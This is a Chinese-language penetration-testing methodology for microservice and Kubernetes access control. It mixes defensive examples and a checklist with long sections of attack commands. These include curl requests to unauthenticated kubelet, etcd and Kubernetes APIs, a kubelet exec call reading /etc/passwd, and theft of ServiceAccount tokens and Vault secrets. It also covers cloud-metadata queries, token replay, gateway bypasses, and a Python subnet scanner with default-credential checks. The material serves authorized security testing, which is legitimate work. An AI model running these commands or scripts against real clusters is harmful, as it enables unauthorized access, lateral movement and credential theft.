# 微服务权限测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

为渗透测试人员提供一套标准化的微服务架构权限测试流程，帮助识别微服务间通信、服务网格、API 网关等场景下的访问控制缺陷。

## 1.2 适用范围

本文档适用于以下场景：
- 微服务架构应用
- 服务网格（Service Mesh）部署
- API 网关架构
- 容器化应用（Kubernetes、Docker Swarm）
- 无服务器架构（Serverless）

## 1.3 读者对象

- 执行微服务安全测试的渗透测试人员
- 进行微服务架构代码审计的安全分析师
- 负责微服务安全开发的开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：微服务权限测试

### 2.1 技术介绍

微服务权限测试是指对微服务架构中的访问控制机制进行系统性测试，验证服务间通信、API 网关、服务发现等组件是否正确实施了权限验证和授权检查。

**微服务架构典型权限问题：**
```
┌─────────────────────────────────────────────────────────┐
│                  微服务权限攻击面                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────┐    ┌─────────┐    ┌─────────┐             │
│  │  API    │───▶│  Gateway │───▶│ Service │             │
│  │  Client │    │          │    │    A    │             │
│  └─────────┘    └─────────┘    └────┬────┘             │
│                                      │                   │
│                    ┌─────────────────┼─────────────┐    │
│                    │                 │             │    │
│                    ▼                 ▼             ▼    │
│              ┌──────────┐    ┌──────────┐   ┌──────────┐│
│              │ Service  │    │ Service  │   │ Service  ││
│              │    B     │    │    C     │   │    D     ││
│              └──────────┘    └──────────┘   └──────────┘│
│                    │                 │             │    │
│                    └─────────────────┼─────────────┘    │
│                                      ▼                   │
│                              ┌──────────────┐           │
│                              │   Database   │           │
│                              └──────────────┘           │
│                                                         │
└─────────────────────────────────────────────────────────┘

攻击面：
1. API 网关配置错误
2. 服务间认证缺失
3. 服务网格策略绕过
4. 容器逃逸和横向移动
5. 服务发现滥用
```

**微服务权限漏洞本质：**
1. **隐式信任** - 服务间默认信任，缺少认证
2. **过度权限** - 服务拥有超出需求的权限
3. **配置错误** - 网络策略、RBAC 配置不当
4. **令牌传递** - 用户令牌在服务间传递不当

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **服务间调用** | 订单服务调用用户服务 | 未验证调用方身份 |
| **API 网关路由** | 网关转发到内部服务 | 路由配置错误暴露内部服务 |
| **服务发现** | Consul、Etcd 查询 | 未授权注册/查询服务 |
| **配置中心** | 从配置中心获取配置 | 未授权访问敏感配置 |
| **消息队列** | Kafka、RabbitMQ 消息 | 未授权发布/订阅消息 |
| **数据库访问** | 多服务共享数据库 | 服务越权访问数据 |
| **容器环境** | Kubernetes Pod 通信 | 网络策略缺失 |
| **无服务器** | Lambda/Function 调用 | 权限配置过宽 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：服务枚举和发现**
```bash
# 1. API 网关探测
# 查找网关暴露的端点
curl https://api.target.com/health
curl https://api.target.com/actuator/health
curl https://api.target.com/swagger.json

# 2. 服务发现枚举
# 如果服务发现接口暴露
curl http://consul.target.com:8500/v1/catalog/services
curl http://etcd.target.com:2379/v2/keys/?recursive=true

# 3. 内部服务探测
# 尝试直接访问内部服务（如果网络可达）
curl http://service-a.internal:8080/health
curl http://10.0.0.10:8080/admin

# 4. 端口扫描
nmap -sV --script http-enum 10.0.0.0/24
```

**步骤二：服务间认证测试**
```bash
# 1. 测试无认证访问内部服务
curl http://internal-service:8080/api/admin/users

# 2. 测试弱认证
curl -u admin:admin http://internal-service:8080/api/admin

# 3. 测试默认凭证
curl -u root:root http://internal-service:8080/api/admin
curl -u admin:password http://internal-service:8080/api/admin

# 4. 测试服务令牌
# 如果服务间使用固定令牌
curl -H "X-Service-Token: internal-secret" \
     http://internal-service:8080/api/admin
```

**步骤三：API 网关绕过测试**
```bash
# 1. 直接访问后端服务
# 绕过网关的权限检查
curl http://backend-service:8080/admin/users

# 2. 利用 Host 头注入
curl -H "Host: internal-service" \
     https://api.target.com/admin/users

# 3. 利用路径遍历
curl https://api.target.com/../internal-service/admin

# 4. 利用 HTTP 方法绕过
curl -X OPTIONS https://api.target.com/admin/users
curl -X TRACE https://api.target.com/admin/users
```

**步骤四：Kubernetes 权限测试**
```bash
# 1. 检查 kubelet 未授权访问
curl -k https://kubelet:10250/pods
curl -k https://kubelet:10250/run/exec

# 2. 检查 Kubernetes API
curl -k https://kubernetes-api:6443/api/v1/namespaces
curl -k https://kubernetes-api:6443/apis/rbac.authorization.k8s.io/v1/clusterroles

# 3. 检查 etcd 未授权访问
curl http://etcd:2379/version
etcdctl --endpoints=http://etcd:2379 get / --prefix --keys-only

# 4. 检查容器元数据
curl http://169.254.169.254/latest/meta-data/
```

#### 2.3.2 白盒测试

**代码审计要点：**
1. 检查服务间通信是否有 mTLS
2. 检查服务是否有适当的 RBAC 策略
3. 检查 API 网关路由配置
4. 检查 Kubernetes NetworkPolicy 配置

**示例（不安全的服务间通信）：**
```yaml
# ❌ 不安全 - Kubernetes 部署缺少网络策略
apiVersion: apps/v1
kind: Deployment
metadata:
  name: user-service
spec:
  template:
    spec:
      containers:
      - name: user-service
        image: user-service:latest
        # 缺少 NetworkPolicy，所有 Pod 都可访问

# ✅ 安全 - 添加网络策略
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: user-service-policy
spec:
  podSelector:
    matchLabels:
      app: user-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: order-service  # 只允许订单服务访问
    ports:
    - protocol: TCP
      port: 8080
```

```java
// ❌ 不安全 - 服务间调用无认证
@RestController
public class UserController {
    @GetMapping("/api/users")
    public List<User> getUsers() {
        // 任何服务都可调用
        return userRepository.findAll();
    }
}

// ✅ 安全 - 添加服务间认证
@RestController
public class UserController {
    @GetMapping("/api/users")
    public List<User> getUsers(@RequestHeader("X-Service-Token") String token) {
        if (!serviceAuthService.validateToken(token)) {
            throw new UnauthorizedException();
        }
        return userRepository.findAll();
    }
}
```

### 2.4 漏洞利用方法

#### 2.4.1 服务间横向移动

```bash
# 1. 利用已入侵的服务作为跳板
# 在 compromised-service 中执行
curl http://user-service:8080/api/users
curl http://order-service:8080/api/orders
curl http://payment-service:8080/api/payments

# 2. 枚举服务环境变量
# 查找其他服务的地址
env | grep SERVICE
env | grep HOST
env | grep PORT

# 3. 利用服务发现
# 如果 DNS 解析可用
nslookup user-service
nslookup order-service
dig +short _http._tcp.user-service.consul SRV
```

#### 2.4.2 权限提升

```bash
# 1. 访问高权限服务
curl http://admin-service:8080/api/admin/config
curl http://config-service:8080/api/config/db-credentials

# 2. 访问敏感数据服务
curl http://vault-service:8200/v1/secret/data/db-password
curl http://secrets-service:8080/api/secrets

# 3. 利用服务令牌
# 如果获取到服务令牌
export SERVICE_TOKEN=$(cat /var/run/secrets/service-token)
curl -H "X-Service-Token: $SERVICE_TOKEN" \
     http://admin-service:8080/api/admin
```

#### 2.4.3 Kubernetes 权限利用

```bash
# 1. 如果 kubelet 未授权访问
# 执行命令
curl -k -X POST https://kubelet:10250/run/exec \
     -d "input=cat /etc/passwd"

# 创建 Pod
curl -k -X POST https://kubelet:10250/pods \
     -H "Content-Type: application/json" \
     -d '{"apiVersion":"v1","kind":"Pod",...}'

# 2. 如果 Kubernetes API 未授权访问
# 列出所有 Secret
curl -k https://k8s-api:6443/api/v1/secrets

# 3. 利用 ServiceAccount
# 读取 Pod 的 ServiceAccount 令牌
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 使用该令牌访问 API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces
```

#### 2.4.4 自动化测试脚本

```python
#!/usr/bin/env python3
"""微服务权限自动化测试脚本"""

import requests
import socket
from concurrent.futures import ThreadPoolExecutor

class MicroservicePermissionTester:
    def __init__(self, target_network):
        self.target_network = target_network
        self.discovered_services = []
    
    def scan_services(self, port_range=range(8000, 9000)):
        """扫描微服务"""
        def check_port(ip_port):
            ip, port = ip_port
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return (ip, port)
            except:
                pass
            return None
        
        # 生成 IP 和端口组合
        ip_port_pairs = []
        for last_octet in range(1, 255):
            ip = f"{self.target_network}.{last_octet}"
            for port in port_range:
                ip_port_pairs.append((ip, port))
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(check_port, ip_port_pairs)
            self.discovered_services = [r for r in results if r]
        
        print(f"发现的服务：{self.discovered_services}")
        return self.discovered_services
    
    def test_service_auth(self, ip, port):
        """测试服务认证"""
        base_url = f"http://{ip}:{port}"
        endpoints = [
            '/', '/health', '/actuator/health',
            '/api/admin', '/admin', '/management'
        ]
        
        for endpoint in endpoints:
            try:
                # 无认证访问
                response = requests.get(f"{base_url}{endpoint}", timeout=3)
                if response.status_code == 200:
                    print(f"[+] 未授权访问：{base_url}{endpoint}")
                
                # 默认凭证测试
                for user, pwd in [('admin', 'admin'), ('root', 'root')]:
                    response = requests.get(
                        f"{base_url}{endpoint}",
                        auth=(user, pwd),
                        timeout=3
                    )
                    if response.status_code == 200:
                        print(f"[+] 默认凭证：{user}:{pwd} @ {base_url}{endpoint}")
            except:
                pass
    
    def test_kubernetes(self):
        """测试 Kubernetes 组件"""
        k8s_components = [
            ('kubelet', 10250),
            ('kubernetes-api', 6443),
            ('etcd', 2379),
            ('dashboard', 443)
        ]
        
        for component, port in k8s_components:
            try:
                response = requests.get(
                    f"https://{component}:{port}",
                    verify=False,
                    timeout=3
                )
                print(f"[*] {component}:{port} - {response.status_code}")
            except:
                pass
    
    def run_full_test(self):
        """运行完整测试"""
        print("[*] 开始扫描微服务...")
        self.scan_services()
        
        print("[*] 测试服务认证...")
        for ip, port in self.discovered_services:
            self.test_service_auth(ip, port)
        
        print("[*] 测试 Kubernetes 组件...")
        self.test_kubernetes()

# 使用示例
tester = MicroservicePermissionTester("10.0.0")
tester.run_full_test()
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过服务网格策略

```bash
# 1. 利用 sidecar 注入漏洞
# 如果 Pod 未注入 sidecar，可能绕过 Istio 策略
kubectl get pods -n istio-system
kubectl describe pod <pod-name> | grep -i sidecar

# 2. 利用出站流量
# 如果 NetworkPolicy 只限制入站
curl http://external-service.com

# 3. 利用主机网络
# 如果 Pod 使用 hostNetwork: true
# 可以直接访问主机网络接口
```

#### 2.5.2 绕过 API 网关

```bash
# 1. 利用内部 DNS
# 如果内部服务可通过 DNS 解析
curl http://user-service.default.svc.cluster.local:8080/admin

# 2. 利用负载均衡器
# 如果负载均衡器配置错误
curl -H "X-Forwarded-Host: internal-service" \
     https://lb.target.com

# 3. 利用服务端口直接访问
# 如果服务端口暴露
curl http://target.com:8081/admin  # 非标准端口
```

#### 2.5.3 令牌重放攻击

```bash
# 1. 捕获服务间令牌
# 从网络流量或日志中获取
SERVICE_TOKEN="eyJhbGciOiJIUzI1NiIs..."

# 2. 重放令牌到其他服务
curl -H "X-Service-Token: $SERVICE_TOKEN" \
     http://other-service:8080/api/admin

# 3. 令牌传递链
# 如果令牌在服务间传递
# A → B → C，可能 C 也接受 A 的令牌
```

#### 2.5.4 利用配置管理

```bash
# 1. 访问配置中心
curl http://config-server:8888/application.yml
curl http://config-server:8888/user-service/profile

# 2. 访问环境变量
# 通过已入侵的服务
curl http://compromised-service:8080/actuator/env

# 3. 访问日志聚合系统
# 可能包含敏感信息
curl http://elasticsearch:9200/logs-*/_search
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| **类别** | **测试目标** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **服务发现** | Consul 枚举 | `curl consul:8500/v1/catalog/services` | 枚举服务 |
| **服务发现** | Etcd 枚举 | `curl etcd:2379/v2/keys/?recursive=true` | 枚举键值 |
| **未授权访问** | Kubelet | `curl -k https://kubelet:10250/pods` | 列出 Pod |
| **未授权访问** | K8s API | `curl -k https://k8s:6443/api/v1` | API 访问 |
| **默认凭证** | 服务认证 | `-u admin:admin` | 默认密码 |
| **网关绕过** | Host 头 | `-H "Host: internal-service"` | 路由绕过 |
| **横向移动** | 服务枚举 | `curl http://service-name:8080` | 服务调用 |
| **权限提升** | 配置访问 | `curl config-service:8080/config` | 获取配置 |

## 3.2 微服务权限测试检查清单

### 网络层面
- [ ] 服务间通信是否加密（mTLS）
- [ ] NetworkPolicy 是否正确配置
- [ ] 内部服务端口是否暴露
- [ ] 容器逃逸是否可能

### 认证层面
- [ ] 服务间调用是否有认证
- [ ] 服务令牌是否安全存储
- [ ] 令牌是否有适当的生命周期
- [ ] 是否使用双向 TLS

### 授权层面
- [ ] 服务是否有最小权限
- [ ] RBAC 策略是否正确配置
- [ ] 服务账户权限是否过宽
- [ ] 是否有服务间访问审计

### 配置层面
- [ ] 敏感配置是否加密
- [ ] 配置中心是否有访问控制
- [ ] 环境变量是否包含敏感信息
- [ ] 日志是否脱敏

### 网关层面
- [ ] API 网关是否覆盖所有端点
- [ ] 网关路由配置是否正确
- [ ] 是否有直接访问后端的路径
- [ ] 网关认证是否可绕过

## 3.3 常用测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **kubectl** | Kubernetes 管理 | `kubectl get pods --all-namespaces` |
| **istioctl** | Istio 调试 | `istioctl analyze` |
| **nmap** | 网络扫描 | `nmap -sV 10.0.0.0/24` |
| **curl** | API 测试 | `curl http://service:port/health` |
| **etcdctl** | Etcd 客户端 | `etcdctl get / --prefix` |
| **consul-cli** | Consul 客户端 | `consul catalog services` |
| **kube-bench** | K8s 基线检查 | `kube-bench` |
| **kubesec** | K8s 安全扫描 | `kubesec scan pod.yaml` |

## 3.4 微服务安全架构参考

```
推荐架构：

┌─────────────────────────────────────────────────────────┐
│                     API Gateway                          │
│                   (认证/授权/限流)                        │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│                   Service Mesh                           │
│              (mTLS/策略/可观测性)                         │
├─────────────┬─────────────┬─────────────┬───────────────┤
│  Service A  │  Service B  │  Service C  │   Service D   │
│  (RBAC)     │  (RBAC)     │  (RBAC)     │   (RBAC)      │
└─────────────┴─────────────┴─────────────┴───────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│              Secrets Management (Vault)                  │
└─────────────────────────────────────────────────────────┘
```

---

## 参考资源

- [OWASP Microservice Security](https://cheatsheetseries.owasp.org/cheatsheets/Microservices_Security_Cheat_Sheet.html)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [Istio Security](https://istio.io/latest/docs/concepts/security/)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
